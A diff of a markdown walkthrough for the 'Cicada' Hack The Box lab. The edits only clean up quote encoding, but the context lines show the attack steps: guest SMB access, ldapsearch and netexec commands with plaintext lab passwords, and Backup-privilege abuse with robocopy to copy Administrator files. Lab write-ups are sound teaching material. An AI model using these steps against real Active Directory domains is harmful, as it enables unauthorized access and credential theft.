@@ -133,13 +133,13 @@ With read access granted to the guest user on the 'HR' share, I proceeded to enu
 smbclient -N //10.10.11.35/HR
 Try "help" to get a list of possible commands.
 smb: \> ls
-  .                                   D        0  Thu Mar 14 08:29:09 2024
-  ..                                  D        0  Thu Mar 14 08:21:29 2024
-  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
+.                                   D        0  Thu Mar 14 08:29:09 2024
+..                                  D        0  Thu Mar 14 08:21:29 2024
+Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
 
 ```
 
-â€œNotice from HR.txtâ€ has an interesting information 
+Notice from "HR.txt" has an interesting information 
 
 ```bash
 Dear new hire!
@@ -279,7 +279,7 @@ Filtering Distinguished Names and Descriptions for Interesting Strings
 ldapsearch -x -H ldap://10.10.11.35 -D 'CICADA\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb"  distinguishedName description
 ```
 
-Finding Password for â€œDavid Oreliousâ€
+Finding Password for "David Orelious"
 
 ```jsx
 # David Orelious, Users, cicada.htb
@@ -289,7 +289,7 @@ distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb
 
 ```
 
-Enumerating Share Access for â€œDavid Oreliousâ€
+Enumerating Share Access for "David Orelious"
 
 ```jsx
 netexec smb 10.10.11.35 -u 'david.orelious' --password 'aRt$Lp#7t*VQ!3' --shares
@@ -307,7 +307,7 @@ SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ        
 SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
 ```
 
-Enumerating Files in the DEV Share with Davidâ€™s Credentials
+Enumerating Files in the DEV Share with David's Credentials
 
 ```jsx
 smbclient //10.10.11.35/DEV -U 'david.orelious'
@@ -407,7 +407,7 @@ User emily.oscars has the Backup privilege enabled. Uploading the necessary modu
 
 ```
 
-Using robocopy to copy the Administratorâ€™s desktop files to a temporary folder.
+Using robocopy to copy the Administrator's desktop files to a temporary folder.
 
 ![image.png]({{ '/assets/img/Cicada/image%204.png' | relative_url }})
 
